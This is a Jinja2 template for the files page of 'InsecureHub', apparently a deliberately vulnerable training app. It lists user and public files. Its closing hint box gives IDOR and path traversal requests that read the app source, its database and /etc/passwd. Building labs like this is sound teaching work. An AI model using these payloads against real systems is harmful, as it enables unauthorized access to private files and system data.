{% extends "base.html" %}
{% block title %}Files â€” InsecureHub{% endblock %}
{% block content %}
<div class="page-container">
    <div class="page-header">
        <h1 class="page-title">ğŸ“ Files</h1>
        <div class="page-actions">
            <a href="{{ url_for('upload_file') }}" class="btn btn-primary btn-sm">â†‘ Upload</a>
            <a href="{{ url_for('read_file') }}" class="btn btn-ghost btn-sm">ğŸ“– Read File</a>
        </div>
    </div>

    <div class="section">
        <h2 class="section-title">My Files</h2>
        {% if my_files %}
        <div class="item-list-card">
            {% for file in my_files %}
            <div class="item-row">
                <div class="item-info">
                    <span class="item-title">{{ file.filename }}</span>
                    <span class="item-meta">
                        ID: <code class="code-inline">{{ file.id }}</code>
                        Â· {% if file.is_private %}<span class="badge-private">Private</span>{% else %}<span
                            class="badge-public">Public</span>{% endif %}
                    </span>
                </div>
                <a href="{{ url_for('download_file', file_id=file.id) }}" class="btn btn-ghost btn-xs">Download</a>
            </div>
            {% endfor %}
        </div>
        {% else %}
        <div class="empty-state-sm">No files uploaded yet.</div>
        {% endif %}
    </div>

    <div class="section">
        <h2 class="section-title">Public Files</h2>
        {% if all_files %}
        <div class="item-list-card">
            {% for file in all_files %}
            <div class="item-row">
                <div class="item-info">
                    <span class="item-title">{{ file.filename }}</span>
                    <span class="item-meta">
                        By: {{ file.username }} Â· ID: <code class="code-inline">{{ file.id }}</code>
                    </span>
                </div>
                <a href="{{ url_for('download_file', file_id=file.id) }}" class="btn btn-ghost btn-xs">Download</a>
            </div>
            {% endfor %}
        </div>
        {% else %}
        <div class="empty-state-sm">No public files.</div>
        {% endif %}
    </div>

    <div class="hint-box hint-vuln">
        <span class="hint-title">ğŸ“‚ Path Traversal + IDOR Hints</span>
        <div class="payload-list">
            <code>GET /file/download/1</code> â€” Admin's private file (IDOR)
            <code>GET /file/read?name=../app.py</code> â€” Read source code
            <code>GET /file/read?name=../insecurehub.db</code> â€” Read database
            <code>GET /file/read?name=../../etc/passwd</code> â€” Read system files
        </div>
    </div>
</div>
{% endblock %}